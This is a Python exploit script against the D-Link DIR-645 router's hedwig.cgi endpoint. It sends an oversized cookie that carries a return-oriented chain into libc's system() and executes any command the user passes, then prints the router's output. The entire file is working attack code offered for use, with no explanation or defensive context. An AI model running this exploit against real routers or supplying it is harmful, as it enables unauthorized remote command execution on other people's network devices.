#!/usr/bin/env python3

import sys
import random
import string
import struct
import requests

if len(sys.argv) < 4:
    print("Usage: dlink_dir645_hedwig_rce.py <host> <port> <command>")
    exit(1)

host = sys.argv[1]
port = sys.argv[2]
command = sys.argv[3]

def random_string(length=16, alphabet=string.ascii_letters + string.digits):
    return "".join(random.choice(alphabet) for _ in range(length))

def exploit(host, port, command):
    print("[*] Crafting buffer overflow...")
    command = command.encode("utf-8")

    libcbase = 0x2aaf8000
    system = 0x000531FF
    calcsystem = 0x000158C8
    callsystem = 0x000159CC
    shellcode = random_string(973).encode("utf-8")
    shellcode += struct.pack("<I", libcbase + system)
    shellcode += random_string(16).encode("utf-8")
    shellcode += struct.pack("<I", libcbase + callsystem)
    shellcode += random_string(12).encode("utf-8")
    shellcode += struct.pack("<I", libcbase + calcsystem)
    shellcode += random_string(16).encode("utf-8")
    shellcode += command

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": b"uid=" + shellcode + b";"
    }

    data = {
        random_string(7): random_string(7)
    }

    print("[*] Sending buffer overflow...")
    response = requests.post(f"http://{host}:{port}/hedwig.cgi", headers=headers, data=data)

    if response.status_code == 200:
        print("[+] Pwned!")
        print('\n' + response.text.split('</hedwig>')[1].strip())
        return
    print("[-] Exploit failed!")

exploit(host, port, command)
